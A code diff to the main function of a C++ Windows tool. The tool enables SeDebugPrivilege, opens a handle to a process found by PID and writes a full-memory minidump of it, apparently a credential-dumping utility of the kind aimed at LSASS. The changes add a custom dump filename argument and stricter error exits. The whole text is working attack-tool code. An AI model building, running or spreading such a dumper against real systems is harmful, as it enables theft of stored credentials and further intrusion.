@@ -152,7 +152,7 @@ string getFileName(string hostname) {
 }
 
 
-int main() {
+int main(int argc, char** argv) {
 	// Check elevated process
 	if (!IsElevatedProcess()) {
 		wcout << "[-] Error: Execute with administrative provileges." << endl;
@@ -163,9 +163,17 @@ int main() {
 	DWORD processPID = getProcessPid();
 	wcout << "[+] Process PID: " << processPID << endl;
 
-	// Get hostname and generate file name
-	string hostname = getHostname();
-	string filename = getFileName(hostname);
+	// Get name for dump file
+	string filename;
+	if (argc >= 2) {
+		// Use custom name from first input argument
+		filename = argv[1];
+	}
+	else {
+		// Get hostname and generate file name
+		string hostname = getHostname();
+		filename = getFileName(hostname);
+	}
 	// Source: https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
 	std::wstring stemp = std::wstring(filename.begin(), filename.end());
 	LPCWSTR pointer_filename = stemp.c_str();
@@ -175,11 +183,9 @@ int main() {
 
 	// Enable SeDebugPrivilege privilege
 	BOOL privAdded = SetPrivilege();
-	if (privAdded) {
-		wcout << "[+] Success: Privilege added correctly." << endl;
-	}
-	else {
-		wcout << "[-] Error: Privilege could not be added." << endl;
+	if (!privAdded) {
+		wcout << "[-] Error: Necessary privilege could not be added." << endl;
+		return 1;
 	}
 
 	// Create handle to the process
@@ -188,7 +194,7 @@ int main() {
 
 	// Dump process
 	if (processHandle && processHandle != INVALID_HANDLE_VALUE) {
-		wcout << "[+] Success: Handle to process created correctly." << endl;
+		wcout << "[+] Handle to process created correctly." << endl;
 		// From https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type - MiniDumpWithFullMemory = 0x00000002
 		BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, outFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
 		if (isDumped) {
@@ -196,10 +202,13 @@ int main() {
 		}
 		else {
 			cout << "[-] Error: Process not dumped." << endl;
+			return 1;
 		}
 	}
 	else {
 		wcout << "[-] Error: Handle to process is NULL." << endl;
+		return 1;
 	}
+
 	return 0;
 }
